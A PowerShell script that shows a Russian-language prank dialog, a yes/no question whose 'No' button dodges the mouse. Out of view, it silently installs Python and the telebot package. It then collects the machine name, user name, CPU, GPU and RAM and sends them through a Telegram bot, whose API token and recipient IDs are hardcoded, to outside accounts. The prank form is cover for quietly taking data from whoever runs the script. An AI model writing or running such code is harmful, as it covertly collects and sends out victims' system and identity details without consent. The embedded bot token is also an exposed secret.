Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing


$pythonInstalled = $null -ne (Get-Command python -ErrorAction SilentlyContinue)

if (-not $pythonInstalled) {
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    
    $uri = "https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe"
    $outFile = "c:/temp/python-3.7.0.exe"
    
    
    Invoke-WebRequest -Uri $uri -OutFile $outFile
    
    
    & $outFile /quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0
} else {

}

pip install telebot -q

$form = New-Object System.Windows.Forms.Form
$form.Text = "шарфееек"
$form.Size = New-Object System.Drawing.Size(300, 150)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.FormBorderStyle = 'FixedDialog'
$form.MinimizeBox = $false
$form.MaximizeBox = $false
$form.ControlBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "А гефене будет?"
$label.Location = New-Object System.Drawing.Point(50, 20)
$label.Size = New-Object System.Drawing.Size(200, 20)
$form.Controls.Add($label)

$button1 = New-Object System.Windows.Forms.Button
$button1.Text = "Да"
$button1.Location = New-Object System.Drawing.Point(50, 60)
$button1.Size = New-Object System.Drawing.Size(75, 23)
$form.Controls.Add($button1)

$button2 = New-Object System.Windows.Forms.Button
$button2.Text = "Нет"
$button2.Location = New-Object System.Drawing.Point(150, 60)
$button2.Size = New-Object System.Drawing.Size(75, 23)
$form.Controls.Add($button2)

$button1.Add_Click({
    $label.Text = "Ладно, прощаю."
    $button1.Visible = $false
    $button2.Visible = $false
    Start-Sleep -Seconds 2
    $form.Close()
})

$button2.Add_Click({
    $label.Text = "Ну ладно."
    Start-Sleep -Seconds 2
    $form.WindowState = 'Minimized'
})

$button2.Add_MouseMove({
    if ($form.WindowState -ne 'Minimized') {
        $random = New-Object System.Random
        $newX = $random.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - $form.Width)
        $newY = $random.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height - $form.Height)
        $form.Location = New-Object System.Drawing.Point($newX, $newY)
    }
})


$form.ShowDialog()

$Global:proc = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
$Global:card = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name
$Global:RAM = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | ForEach-Object { $_.Sum / 1GB }
$opened = $True


function Run-PythonCode {
    param(
        [string]$code,
        [bool]$opened
    )
    $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
    "opened = $opened" | Out-File -FilePath $tempFile -Encoding UTF8
    $code | Out-File -FilePath $tempFile -Encoding UTF8 -Append
    Start-Process "python" -ArgumentList $tempFile -NoNewWindow -Wait
    Remove-Item $tempFile -Force
}




$pythonCode = @"
import telebot

API_TOKEN = '6730763327:AAGxl4cAcyersiVS3uHh69IPf8HgJhPhDK8'
bot = telebot.TeleBot(API_TOKEN)

# Hardcoded user IDs
user_ids = [5989221427, 5376773282]

@bot.message_handler(commands=['start'])
def handle_start(message):
    global user_ids
    if message.chat.id not in user_ids:
        user_ids.append(message.chat.id)
    bot.reply_to(message, "Зарегистрировано")

def broadcast_message(message):
    global user_ids
    if not user_ids:
        return
    for user_id in user_ids:
        try:
            bot.send_message(user_id, message)
        except Exception as e:
            pass

if opened:
    broadcast_message(' $env:COMPUTERNAME $env:USERNAME это комп шарфика\n$card\n$proc\n$RAM GB Оперативки')

if __name__ == '__main__':
    bot.polling()
"@


Run-PythonCode -code $pythonCode -opened $opened
